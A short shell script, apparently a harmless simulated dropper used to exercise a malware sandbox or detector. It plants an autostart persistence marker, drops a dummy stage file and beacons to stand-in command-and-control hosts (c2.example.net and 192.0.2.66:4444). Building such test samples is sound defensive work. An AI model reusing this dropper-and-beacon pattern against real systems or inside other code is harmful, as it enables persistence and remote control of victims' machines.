#!/bin/sh
# Behaves like a Linux-side dropper: resolve a host, fetch a stage, drop and chmod it.
echo "[sample] starting"
mkdir -p "$HOME/.config/autostart" 2>/dev/null
echo "persistence marker" > "$HOME/.config/autostart/updater.desktop"
printf 'stage2 body' > /tmp/work/stage2.bin
chmod 755 /tmp/work/stage2.bin
# Resolves through the sandbox's fake DNS; the sink records the request.
getent hosts c2.example.net >/dev/null 2>&1
python3 - <<'PY' 2>/dev/null
import socket, urllib.request
try:
    urllib.request.urlopen("http://c2.example.net/gate.php?id=victim", timeout=4).read()
except Exception:
    pass
try:
    s = socket.create_connection(("192.0.2.66", 4444), timeout=3)
    s.send(b"beacon")
    s.close()
except Exception:
    pass
PY
rm -f /tmp/work/stage2.bin
echo "[sample] done"
